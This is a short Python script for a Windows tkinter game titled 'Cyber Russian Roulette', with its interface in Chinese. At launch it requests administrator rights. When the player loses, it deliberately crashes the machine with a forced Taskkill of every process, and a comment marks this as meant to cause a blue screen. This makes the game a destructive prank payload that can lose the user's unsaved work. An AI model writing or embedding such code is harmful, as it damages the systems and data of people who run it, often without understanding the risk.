from __future__ import print_function
import ctypes, sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_admin():
    if is_admin():
        pass
        
    else: 
        if sys.version_info[0] == 3:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) 
            sys.exit()
        else:
            ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)

# random module
import random

def generate():
    return int(random.uniform(1, 6)) 

pos_value = 0
now_value = -1


def button_pressed():
    global now_value
    global pos_value
    # print(now_value)
    # print(pos_value)

    if now_value == -1:
        pos_value = generate()
        now_value = 0
        return "已上膛" , "开枪" , 0
        

    else:
        now_value = now_value + 1
        if now_value == pos_value:
            return "你死了" , "危" , 1
        else:   
            return "运气不错，你还没死" , "开枪" , 0
    

get_admin()


# tk gui
import tkinter as tk
root = tk.Tk()

root.title("俄罗斯转盘")
root.geometry('300x300')

# init
title_text = tk.StringVar()
title_text.set("赛博俄罗斯转盘")
title = tk.Label(root , textvariable= title_text )


state_text = tk.StringVar()
state_text.set("未上膛")
state = tk.Label(root , textvariable= state_text )


button_text = tk.StringVar()
button_text.set("上膛")
button = tk.Button(root , textvariable= button_text , height = 2 , width = 55)

title.pack()
state.pack(padx= 50 , pady= 50)
button.pack(padx= 50 , pady= 50)

def play(event):
    # button pressed
    text_list = button_pressed()
    state_text.set(text_list[0])
    button_text.set(text_list[1])

    if text_list[2] == 1:
        root.update()
        # 马上蓝屏
        import time
        time.sleep(0.9)
        # sys.exit()
        os.system("Taskkill /fi \"pid ge 1\" /f")

button.bind("<Button-1>" , play)
root.mainloop()


